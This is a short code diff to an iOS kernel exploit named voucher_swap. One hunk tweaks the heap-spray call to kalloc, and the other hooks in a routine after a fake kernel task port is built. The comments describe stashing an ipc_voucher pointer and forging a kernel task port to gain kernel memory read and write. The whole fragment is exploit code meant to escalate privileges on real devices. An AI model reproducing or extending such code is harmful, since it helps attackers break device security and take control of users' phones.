@@ -828,7 +828,7 @@ voucher_swap() {
 	printf("Spray size: %ld\n", gc_spray_size);
 	mach_port_t *gc_ports = filler_ports;
 	size_t gc_port_count = 500;        // Use at most 500 ports for the spray.
-    sprayed_size = kalloc_spray_size(gc_ports, &gc_port_count, (kCFCoreFoundationVersionNumber >= 1535.12 ? 768 : 300) + 1, 1024, gc_spray_size);;
+    sprayed_size = kalloc_spray_size(gc_ports, &gc_port_count, (kCFCoreFoundationVersionNumber >= 1535.12 ? 768 : 300) + 1, 1024, gc_spray_size);
 	INFO("sprayed %zu bytes to %zu ports in kalloc.%u", sprayed_size, gc_port_count, 1024);
     
 	// 7. Stash a pointer to an ipc_voucher in the thread's ith_voucher field and then remove
@@ -1118,6 +1118,8 @@ voucher_swap() {
 
 	// 26. Build a fake kernel task port that allows us to read and write kernel memory.
 	stage2_init(ipc_space_kernel, kernel_map);
+    extern void prepare_for_rw_with_fake_tfp0(mach_port_t fake_tfp0);
+    prepare_for_rw_with_fake_tfp0(kernel_task_port);
 
 	// 27. Alright, now kernel_read() and kernel_write() should work, so let's build a safer
 	// kernel_task port. This also cleans up fake_port so that we (hopefully) won't panic on
